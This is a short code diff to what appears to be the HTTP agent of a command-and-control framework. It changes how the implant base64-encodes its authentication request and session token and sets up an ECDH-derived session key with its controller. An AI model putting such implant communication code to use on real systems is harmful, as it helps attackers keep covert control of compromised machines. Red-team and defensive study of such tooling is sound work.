@@ -20,6 +20,7 @@ using Agent.Core.Utils.Encryption;
 using System.Text.Json.Serialization;
 using System.Text;
 
+
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
 
@@ -58,7 +59,9 @@ var authRequest = new C2Request
 
 baseCommunicationService.SetHeader("Auth-Token", Convert.ToBase64String(Encoding.UTF8.GetBytes(baseConfig.Token)));
 
-var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
+var authRequestJson = JsonSerializer.Serialize(authRequest);
+var authResponse = baseCommunicationService.SimplePostAsync("/", Convert.ToBase64String(Encoding.UTF8.GetBytes(authRequestJson)));
+
 baseCommunicationService.ClearHeaders(); // Clear the auth token header
 
 // TEMP
@@ -71,7 +74,7 @@ var decodedAuthResponse = JsonSerializer.Deserialize<AuthenticationResponse>(aut
 var peerPublicKey = Convert.FromBase64String(decodedAuthResponse.PublicKey);
 byte[] sharedSecret = ECDHUtils.DeriveECDHSharedSecret(privKey, peerPublicKey);
 
-baseCommunicationService.SetHeader("Session-Token", Convert.ToBase64String(Encoding.UTF8.GetBytes(decodedAuthResponse.SessionToken)));
+baseCommunicationService.SetHeader("Session-Token", decodedAuthResponse.SessionToken);
 
 // TEMP
 string jsonOutput = JsonSerializer.Serialize(baseConfig);
